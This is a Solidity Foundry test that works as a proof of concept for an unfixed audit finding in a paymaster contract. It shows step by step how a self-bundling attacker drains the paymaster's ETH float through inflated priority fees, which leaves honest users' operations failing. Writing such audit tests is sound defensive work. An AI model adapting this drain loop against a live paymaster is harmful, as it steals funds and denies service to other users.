// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// OPEN FINDING (docs/audit-2026-11-14.md): this test demonstrates a vulnerability that is NOT fixed yet and
// passes while it exists. When the fix lands, invert its assertions into a regression test.

// Place in contracts/test/paymaster/. Inherits the existing PaymasterV5Test harness, so run only these tests:
//   forge test --match-contract PaymasterV5FindingsPoC --match-test "test_PM" -vv

import {PaymasterV5Test} from "./PaymasterV5.t.sol";
import {MiniAccount} from "./PaymasterTestBase.sol";
import {PackedUserOperation as EpOp} from "../vendor/aa-v07/interfaces/PackedUserOperation.sol";
import {IEntryPoint} from "../vendor/aa-v07/interfaces/IEntryPoint.sol";
import {DisciplePaymasterV5 as PM} from "../../src/paymaster/DisciplePaymasterV5.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {console2} from "forge-std/console2.sol";

contract PaymasterV5FindingsPoC is PaymasterV5Test {
    address attacker = makeAddr("attacker");
    /// PM-2: the reusable allowance quote does not bind gasFees. An account holder bundles its own ops through the
    /// public EntryPoint with a large priority fee and itself as beneficiary: every op converts USDG credit into the
    /// paymaster's ETH float at the signed rate. Repeating within one allowance window empties the float and every
    /// other player's op then fails AA31 until the owner manually refills.
    function test_PM_selfBundledPriorityFeeEmptiesFloat() public {
        // Mirror live float: deposit 13043478260869566 wei (~$30 at 2300).
        uint256 live = 13_043_478_260_869_566;
        uint256 excess = pm.getDeposit() - live;
        vm.prank(owner);
        pm.withdrawTo(payable(owner), excess);
        assertEq(pm.getDeposit(), live);

        _fund(900_000_000); // attacker's own account holds ~$900 credit
        // Realistic server allowance ceiling: ~0.30 USDG per op (TRADE_GAS_LIMIT x 2x fee headroom at 0.01 gwei).
        uint256 maxTok = 300_000;
        uint256 units = _gasUnits();
        uint256 fee = (maxTok * 1e18 / RATE) / units; // highest fee the signed ceiling allows (~0.18 gwei)
        uint256 treasuryBefore = usdg.balanceOf(treasury);
        uint256 ethBefore = attacker.balance;
        uint256 ops = _drain(fee, maxTok);
        // scrape the remainder with lower fees
        ops += _drain(fee / 8, maxTok);
        ops += _drain(fee / 64, maxTok);
        console2.log("ops until float exhausted", ops);
        console2.log("float left (wei)", pm.getDeposit());
        console2.log("attacker ETH gained (wei)", attacker.balance - ethBefore);
        console2.log("treasury USDG received (raw)", usdg.balanceOf(treasury) - treasuryBefore);
        assertLt(pm.getDeposit(), units * 10_000_000, "float can no longer prefund even a 0.01 gwei op");
        assertGt(attacker.balance - ethBefore, live * 9 / 10, ">90% of the float went to the self-bundler");

        // An honest player's ordinary 0.01 gwei op now fails at EntryPoint prefund.
        MiniAccount honest = new MiniAccount(address(ep), user);
        usdg.mint(address(honest), 10_000_000);
        vm.startPrank(address(honest));
        usdg.approve(address(pm), 10_000_000);
        pm.deposit(address(honest), 10_000_000);
        vm.stopPrank();
        EpOp memory h = _opFor(address(honest), _trade(), 0);
        h.gasFees = bytes32((uint256(10_000_000) << 128) | uint256(10_000_000));
        uint256 hTok = pm.tokenCost(units * 10_000_000, RATE);
        h = _signFor(h, hTok, USER_PK);
        _mustRevert(h, abi.encodeWithSelector(IEntryPoint.FailedOp.selector, 0, "AA31 paymaster deposit too low"));
    }

    function _drain(uint256 fee, uint256 maxTok) internal returns (uint256 ops) {
        for (; ops < 3000; ++ops) {
            EpOp memory op = _op(_trade());
            op.gasFees = bytes32((fee << 128) | fee);
            op = _sign(op, maxTok, pm.ALLOWANCE_TYPEHASH());
            EpOp[] memory batch = new EpOp[](1);
            batch[0] = op;
            vm.prank(attacker, attacker);
            try ep.handleOps(batch, payable(attacker)) {} catch { break; }
        }
    }
}
